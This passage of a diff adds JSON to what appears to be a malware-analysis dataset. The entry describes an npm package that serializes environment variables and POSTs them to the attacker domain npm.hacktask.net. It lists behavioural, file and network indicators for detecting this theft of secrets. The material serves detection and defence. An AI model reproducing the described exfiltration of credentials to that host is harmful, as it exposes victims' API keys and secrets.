+                    "action": "The collected environment variables are serialized and sent via HTTP POST to the attacker's server (npm.hacktask.net).",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker gains access to sensitive credentials, API keys, and secrets from the victim's environment."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to process.env or equivalent environment variable APIs in package entrypoints",
+                    "Serialization of environment variables into JSON or similar formats",
+                    "Outbound network requests to hardcoded or suspicious domains during import or runtime",
+                    "Exfiltration of large JSON payloads containing environment data"
+                  ],
+                  "file_indicators": [
+                    "index.js or main entrypoint containing code that accesses process.env and sends HTTP requests",
+                    "References to npm.hacktask.net or similar suspicious domains in source code",
+                    "Presence of HTTP request logic in package entrypoints"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP POST requests to npm.hacktask.net",
+                    "Unusual traffic to domains not associated with the legitimate package",
+                    "Large POST payloads containing environment variable data"
+                  ],
+                  "how_to_detect": "Use static analysis to identify npm packages that access process.env and serialize its contents, especially in entrypoint files like index.js. Flag packages that make outbound HTTP requests to hardcoded or suspicious domains such as npm.hacktask.net. Monitor runtime behavior for large JSON payloads containing environment variables being sent over the network. Review package names for typo-squatting patterns that mimic popular libraries."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
